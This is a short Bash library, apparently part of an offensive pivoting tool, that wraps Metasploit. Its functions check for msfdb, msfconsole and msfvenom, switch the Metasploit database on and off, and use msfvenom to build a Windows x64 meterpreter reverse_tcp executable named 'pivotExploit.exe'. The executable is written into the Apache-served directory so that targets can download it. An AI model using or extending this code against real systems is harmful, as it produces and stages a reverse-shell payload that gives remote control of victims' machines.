# This metasploit.sh file is developed as an shell library, Never run this file alone

# handles network stuff
source sourcelib/networkpref.sh

# handles args checking stuff
source sourcelib/argcheck.sh

# handles all apache2 stuff
source sourcelib/serverweb.sh

# handles colors stuff
source sourcelib/colors.sh

# msf vars
PAYLOADFILE="pivotExploit.exe"
PAYLOAD="windows/x64/meterpreter/reverse_tcp"
MSFDBSTATUS=""

# checks msfdb installation
checkMsfdb()
{
  which msfdb &> /dev/null || return 1
}

# checks metasploit framework installation
checkMsfconsole()
{
  which msfconsole &> /dev/null || return 1
}

# checks msfvenom installation
# this is mandatory after the msfconsole check
checkMsfvenom()
{
  which msfvenom &> /dev/null || return 1
}

# toggles msfdb Server
msfDBServer()
{
  checkarg 1 "$@"

  if [[ ${1} = "on" ]];
	then
		msfdb start &> /dev/null
		MSFDBSTATUS="ON"
		return 0
	elif [[ ${1} = "off" ]];
	then
		msfdb stop &> /dev/null
		MSFDBSTATUS="OFF"
		return 0
	else
		return 1
	fi

}

# generates PAYLOAD to PAYLOADFILE using MSFVenom
generatePayload()
{
  msfvenom -p ${PAYLOAD} LHOST=${LOCALHOST} LPORT=${LOCALPORT} -f exe -a x64 -o ${SERVERDIRECTORY}${PAYLOADFILE} &> /dev/null && return 0
}
